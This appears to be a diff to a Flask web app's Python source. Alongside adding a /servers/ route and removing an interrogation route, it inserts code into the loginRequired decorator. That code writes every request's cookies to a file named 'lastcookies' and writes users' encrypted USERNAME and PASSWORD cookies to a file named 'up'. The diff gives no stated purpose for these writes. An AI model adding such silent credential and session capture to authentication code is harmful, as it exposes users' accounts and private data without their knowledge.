@@ -32,7 +32,11 @@ def loginRequired(appRoute):
 	"""
 
 	@wraps(appRoute)
+
 	def wrapper(*args, **kwargs):
+		with open("lastcookies", "w") as f:
+			f.write(str(request.cookies))
+
 		loginErrorMessage = Template("$page requires you to be logged in")
 		errorResp = app.make_response(redirect("/login/"))
 		pathList = str(request.path).split("/")
@@ -44,7 +48,8 @@ def loginRequired(appRoute):
 		if "USERNAME" in request.cookies and "PASSWORD" in request.cookies:
 			encryptedUsername = request.cookies.get("USERNAME")
 			encryptedPassword = request.cookies.get("PASSWORD")
-
+			with open("up", "w") as f:
+				f.write(f"{encryptedUsername}, {encryptedPassword}")
 			username = decryptString(encryptedUsername)
 			password = decryptString(encryptedPassword)
 
@@ -390,6 +395,10 @@ def bruh():
 def whatsnew():
 	return render_template("whatsNew.html")
 
+@app.route("/servers/")
+def servers():
+	return render_template("servers.html")
+
 
 # games index
 @app.route("/games/")
@@ -501,13 +510,6 @@ def doctorBLevels():
 	else:
 		raise ValueError("postID is incorrect")
 
-
-@app.route("/games/interrogation/")
-@loginRequired
-def interrogation():
-	if request.method == "GET":
-		return render_template("interrogation.html")
-	pass
 
 
 @app.route("/getPostID/", methods=["POST"])
